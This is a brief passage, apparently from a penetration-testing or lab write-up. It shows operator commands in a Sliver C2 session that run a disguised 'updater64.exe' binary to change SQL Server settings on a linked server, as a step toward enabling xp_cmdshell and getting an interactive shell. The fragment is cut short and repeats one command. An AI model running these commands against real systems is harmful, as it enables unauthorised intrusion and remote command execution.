...
# Enable XP_CMDshell
sliver > execute C:\Windows\ProgramData\updater64.exe -S 10.9.20.13 -Q "EXECUTE('sp_configure ''show advanced options'', ''1''') AT[m3sqlw.m3c.local];"

# Spawn an interactive shell
sliver > shell
sliver > C:\Windows\ProgramData\updater64.exe -S 10.9.20.13 -Q "EXECUTE('sp_configure ''show advanced options'', ''1''') AT[m3sqlw.m3c.local];"
sliver > 
```